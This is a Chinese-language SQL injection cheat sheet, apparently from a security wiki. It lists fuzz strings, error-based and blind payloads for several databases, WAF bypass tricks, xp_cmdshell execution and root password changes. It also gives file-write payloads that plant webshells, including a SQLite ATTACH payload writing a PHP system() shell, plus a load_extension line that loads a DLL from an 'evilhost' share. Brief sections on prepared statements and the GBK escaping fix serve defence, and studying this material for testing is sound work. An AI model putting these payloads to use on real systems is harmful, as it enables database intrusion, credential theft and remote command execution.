
# SQL注入

## 简介

SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

## 分类

### 按技巧分类

根据使用的技巧，SQL注入类型可分为

- 盲注
    - 布尔盲注：只能从应用返回中推断语句执行后的布尔值
    - 时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断
- 报错注入：应用会显示全部或者部分的报错信息
- 堆叠注入：有的应用可以加入 ``;`` 后一次执行多条语句
- 其他

### 按获取数据的方式分类

另外也可以根据获取数据的方式分为3类

#### inband

利用Web应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。

#### inference

通过Web的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注，
通过web应用的其他改变来推断数据。

#### out of band (OOB)

通过其他传输方式来获得数据，比如DNS解析协议和电子邮件。

## 注入检测

### 常见的注入点

- GET/POST/PUT/DELETE参数
- X-Forwarded-For
- 文件名

### Fuzz注入点

- ``'`` / ``"``
- ``1/1``
- ``1/0``
- ``and 1=1``
- ``" and "1"="1``
- ``and 1=2``
- ``or 1=1``
- ``or 1=``
- ``' and '1'='1``
- ``+`` ``-`` ``^`` ``*`` ``%`` ``/`` 
- ``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``
- ``~``
- ``!``
- ``@``
- 反引号执行

### 测试用常量

- ``@@version``
- ``@@servername``
- ``@@language``
- ``@@spid``

### 测试列数

例如 ``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 ``null`` 至不返回

### 延时盲注

延迟注入，是一种盲注的手法, 提交对执行时间铭感的函数sql语句，通过执行时间的长短来判断是否执行成功，比如:正确的话会导致时间很长，错误的话会导致执行时间很短

- sleep()
- if()
- ascii()
- substring()

### 报错注入

- ``select 1/0``
- ``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a``
- ``extractvalue(1, concat(0x5c,(select user())))``
- ``updatexml(0x3a,concat(1,(select user())),1)``
- ``exp(~(SELECT * from(select user())a))``
- ``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``
- ``GTID_SUBSET(version(), 1)``

### 基于geometric的报错注入

- ``GeometryCollection((select * from (select * from(select user())a)b))``
- ``polygon((select * from(select * from(select user())a)b))``
- ``multipoint((select * from(select * from(select user())a)b))``
- ``multilinestring((select * from(select * from(select user())a)b))``
- ``LINESTRING((select * from(select * from(select user())a)b))``
- ``multipolygon((select * from(select * from(select user())a)b))``

其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 `commit 95825f <https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_ 。

而以上列表中基于geometric的报错注入在这个 `commit 5caea4 <https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ 中被修复，在5.5.x较后的版本中同样不再生效。

### 堆叠注入

- ``;select 1``

### 注释符

- ``#``
- ``--+``
- ``/*xxx*/``
- ``/*!xxx*/``
- ``/*!50000xxx*/``

### 判断过滤规则

- 是否有trunc
- 是否过滤某个字符
- 是否过滤关键字
- slash和编码

### 获取信息

- 判断数据库类型
    - ``and exists (select * from msysobjects ) > 0`` access数据库
    - ``and exists (select * from sysobjects ) > 0`` SQLServer数据库

- 判断数据库表
    - ``and exsits (select * from admin)``

- 版本、主机名、用户名、库名
- 表和字段
    - 确定字段数
        - Order By
        - Select Into
    - 表名、列名

### 测试权限

- 文件操作
    - 读敏感文件
    - 写shell
- 带外通道
    - 网络请求


## 权限提升

### UDF提权

UDF（User Defined Function，用户自定义函数）是MySQL提供的一个功能，可以通过编写DLL扩展为MySQL添加新函数，扩充其功能。
当获得MySQL权限之后，即可通过这种方式上传自定义的扩展文件，从MySQL中执行系统命令。

## 数据库检测

### MySQL

- sleep ``sleep(1)``
- benchmark ``BENCHMARK(5000000, MD5('test'))``
- 字符串连接
    - ``SELECT 'a' 'b'``
    - ``SELECT CONCAT('some','string')``
- version 
    - ``SELECT @@version``
    - ``SELECT version()``
- 识别用函数
    - ``connection_id()``
    - ``last_insert_id()``
    - ``row_count()``

### Oracle

- 字符串连接 
    - ``'a'||'oracle' --``
    - ``SELECT CONCAT('some','string')``
- version 
    - ``SELECT banner FROM v$version``
    - ``SELECT banner FROM v$version WHERE rownum=1``

### SQLServer

- WAITFOR ``WAITFOR DELAY '00:00:10';``
- SERVERNAME ``SELECT @@SERVERNAME``
- version ``SELECT @@version``
- 字符串连接
    - ``SELECT 'some'+'string'``
- 常量
    - ``@@pack_received``
    - ``@@rowcount``

### PostgreSQL

- sleep ``pg_sleep(1)``

## 绕过技巧

waf的绕过技巧主要是以组合变换数据报文，让waf的检测无效化，达到有效攻击的技巧。这是waf本身具有的缺陷。

waf的部署类型

- 内嵌型waf

        内嵌型waf直接hook到应用服务中，嵌入型waf从web容器模块型waf、代码层waf往下走，其对抗畸形报文、扫操作绕过的能力会越来越强。
        但是，维护成本相对较高，属于一个应用一个waf。类似个人版本的安全狗、RASP都属于嵌入型。

- 非内嵌型waf

        非内嵌型waf，非嵌入型waf对web流量的解析完全是靠自身的，似nginx的反向代理，waf将分析过的web流量处理转发。

### 分块传输绕过

分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。

目前分块传输是比较有效的绕过waf的技术。

- Transfer-Encoding绕过
- keep-alive绕过

### 域名绕过

- 有些WAF设置的是针对域名的防护，在有些时候，我们可以尝试将域名改成ip地址有可以绕过WAF的防护。

### 编码绕过

- 大小写
- url编码
- html编码
- 十六进制编码
- unicode编码

### 注释

- ``//`` ``--`` ``-- +`` ``-- -`` ``#`` ``/**/`` ``;%00``
- 内联注释用的更多，它有一个特性 ``/!**/`` 只有MySQL能识别
- e.g. ``index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3``

### 只过滤了一次时

- ``union`` => ``ununionion``

### 相同功能替换

- 函数替换
    - ``substring`` / ``mid`` / ``sub``
    - ``ascii`` / ``hex`` / ``bin``
    - ``benchmark`` / ``sleep``
- 变量替换
    - ``user()`` / ``@@user``
- 符号和关键字
    - ``and`` / ``&``
    - ``or`` / ``|``

### HTTP参数

- HTTP参数污染
    - ``id=1&id=2&id=3`` 根据容器不同会有不同的结果
- HTTP分割注入

### 缓冲区溢出

- 一些C语言的WAF处理的字符串长度有限，超出某个长度后的payload可能不会被处理
- 二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过

## SQL注入小技巧

### 宽字节注入

一般程序员用gbk编码做开发的时候，会用 ``set names 'gbk'`` 来设定，这句话等同于


    set
    character_set_connection = 'gbk',
    character_set_result = 'gbk',
    character_set_client = 'gbk';

漏洞发生的原因是执行了 ``set character_set_client = 'gbk';`` 之后，mysql就会认为客户端传过来的数据是gbk编码的，从而使用gbk去解码，而mysql_real_escape是在解码前执行的。但是直接用 ``set names 'gbk'`` 的话real_escape是不知道设置的数据的编码的，就会加 ``%5c`` 。此时server拿到数据解码  就认为提交的字符+%5c是gbk的一个字符，这样就产生漏洞了。

解决的办法有三种，第一种是把client的charset设置为binary，就不会做一次解码的操作。第二种是是 ``mysql_set_charset('gbk')`` ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。
第三种就是用pdo。

还有一些其他的编码技巧，比如latin会弃掉无效的unicode，那么admin%32在代码里面不等于admin，在数据库比较会等于admin。

## 常用攻击载荷(Payload)

### SQL Server Payload

- Version 
    - ``SELECT @@version``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT /*comment*/1``
- Space
    - ``0x01 - 0x20``
- Current User
    - ``SELECT user_name()``
    - ``SELECT system_user``
    - ``SELECT user``
    - ``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``
- List User
    - ``SELECT name FROM master..syslogins``
- Current Database
    - ``SELECT DB_NAME()``
- List Database
    - ``SELECT name FROM master..sysdatabases``
- Command
    - ``EXEC xp_cmdshell 'net user'``
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
    - ``SELECT char(65)+char(66)`` => return ``AB``
- Delay
    - ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
- Change Password
    - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
- Trick
    - ``id=1 union:select password from:user``

### MySQL Payload

- Version
    - ``SELECT @@version``
- Comment
    - ``SELECT 1 -- comment``
    - ``SELECT 1 # comment``
    - ``SELECT /*comment*/1``
- Space
    - ``0x9`` ``0xa-0xd`` ``0x20`` ``0xa0``
- Current User
    - ``SELECT user()``
    - ``SELECT system_user()``
- List User
    - ``SELECT user FROM mysql.user``
- Current Database
    - ``SELECT database()``
- List Database
    - ``SELECT schema_name FROM information_schema.schemata``
- List Tables
    - ``SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
- List Columns
    - ``SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
- If
    - ``SELECT if(1=1,'foo','bar');`` return 'foo'
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
    - ``SELECT 0x414243`` => return ``ABC``
- Delay
    - ``sleep(1)``
    - ``SELECT BENCHMARK(1000000,MD5('A'))``
- Read File
    - ``select @@datadir``
    - ``select load_file('databasename/tablename.MYD')``
- Blind
    - ``ascii(substring(str,pos,length)) & 32 = 1``
- Error Based
    - ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
    - ``select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))``
- Change Password
    - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``

#### 报错注入常见函数

- extractvalue
- updatexml
- GeometryCollection
- linestring
- multilinestring
- multipoint
- multipolygon
- polygon
- exp

#### 写文件

#### 写文件前提

- root 权限
- 知晓文件绝对路径
- 写入的路径存在写入权限
- secure_file_priv 允许向对应位置写入
- ``select count(file_priv) from mysql.user``

#### 基于 into 写文件

    union select 1,1,1 into outfile '/tmp/demo.txt'
    union select 1,1,1 into dumpfile '/tmp/demo.txt'

dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏

#### 基于 log 写文件

    show variables like '%general%';
    set global general_log = on;
    set global general_log_file = '/path/to/file';
    select '<?php var_dump("test");?>';
    set global general_log_file = '/original/path';
    set global general_log = off;

### Oracle Payload

- dump
    - ``select * from v$tablespace;``
    - ``select * from user_tables;``
    - ``select column_name from user_tab_columns where table_name = 'table_name';``
    - ``select column_name, data_type from user_tab_columns where table_name = 'table_name';``
    - ``SELECT * FROM ALL_TABLES``
- Comment
    - ``--``
    - ``/**/``
- Space
    - ``0x00`` ``0x09`` ``0xa-0xd`` ``0x20``
- 报错
    - ``utl_inaddr.get_host_name``
    - ``ctxsys.drithsx.sn``
    - ``ctxsys.CTX_REPORT.TOKEN_TYPE``
    - ``XMLType``
    - ``dbms_xdb_version.checkin``
    - ``dbms_xdb_version.makeversioned``
    - ``dbms_xdb_version.uncheckout``
    - ``dbms_utility.sqlid_to_sqlhash``
    - ``ordsys.ord_dicom.getmappingxpath``
    - ``utl_inaddr.get_host_name``
    - ``utl_inaddr.get_host_address``
- OOB
    - ``utl_http.request``
    - ``utl_inaddr.get_host_address``
    - ``SYS.DBMS_LDAP.INIT``
    - ``HTTPURITYPE``
    - ``HTTP_URITYPE.GETCLOB``
- 绕过
    - ``rawtohex``

#### 写文件

    create or replace directory TEST_DIR as '/path/to/dir';
    grant read, write on directory TEST_DIR to system;
    declare
       isto_file utl_file.file_type;
    begin
       isto_file := utl_file.fopen('TEST_DIR', 'test.jsp', 'W');
       utl_file.put_line(isto_file, '<% out.println("test"); %>');
       utl_file.fflush(isto_file);
       utl_file.fclose(isto_file);
    end;

### PostgresSQL Payload

- Version 
    - ``SELECT version()``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT /*comment*/1``
- Current User
    - ``SELECT user``
    - ``SELECT current_user``
    - ``SELECT session_user``
    - ``SELECT getpgusername()``
- List User
    - ``SELECT usename FROM pg_user``
- Current Database
    - ``SELECT current_database()``
- List Database
    - ``SELECT datname FROM pg_database``
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
- Delay
    - ``pg_sleep(1)``

### SQLite3 Payload

- Comment
    - ``--``
    - ``/**/``
- Version
    - ``select sqlite_version();``

#### Command Execution

    ATTACH DATABASE '/var/www/lol.php' AS lol;
    CREATE TABLE lol.pwn (dataz text);
    INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--

#### Load_extension

``UNION SELECT 1,load_extension('\\evilhost\evil.dll','E');--``

## 预编译

SQL注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode，第二次交互发送数据，代入AST或Opcode中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。

### 模拟预编译

为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。

### 绕过

- 预编译使用错误

    预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。

- 部分参数不可预编译

    在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。

- 预编译实现错误

    部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。

## 参考文章

- `NoSQL注入的分析和缓解 <http://www.yunweipai.com/archives/14084.html>`_
- `NoSQL注入 <https://mp.weixin.qq.com/s/tG874LNTIdiN7MPtO-hovA>`_
- `SQL注入ByPass的一些小技巧 <https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg>`_
- `sqlmap time based inject 分析 <http://blog.wils0n.cn/archives/178/>`_
- `SQLInjectionWiki <https://github.com/NetSPI/SQLInjectionWiki>`_
- `Waf Bypass之道 <https://xz.aliyun.com/t/368>`_
- `MySQL Bypass Wiki <https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI>`_
- `常见数据库写入Webshell汇总 <https://mp.weixin.qq.com/s/BucCNyCmyATdRENZp0AF2A>`_
- `分块传输Bypass Waf <https://www.cnblogs.com/backlion/p/10569976.html>`_